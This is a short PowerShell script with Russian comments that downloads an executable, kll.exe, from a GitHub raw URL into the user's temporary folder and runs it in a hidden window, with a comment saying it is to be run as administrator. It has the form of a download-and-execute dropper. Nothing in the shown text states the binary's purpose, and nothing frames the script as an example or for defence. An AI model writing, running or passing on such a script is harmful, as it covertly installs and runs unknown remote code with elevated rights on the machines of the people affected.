# Запускать от имени администратора
$url    = 'https://github.com/ShramC/Windows/raw/refs/heads/main/kll.exe'
$dest   = Join-Path $env:TEMP 'kll.exe'

# Скачивание
Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing

# Запуск в фоне (скрытое окно)
Start-Process -FilePath $dest -WindowStyle Hidden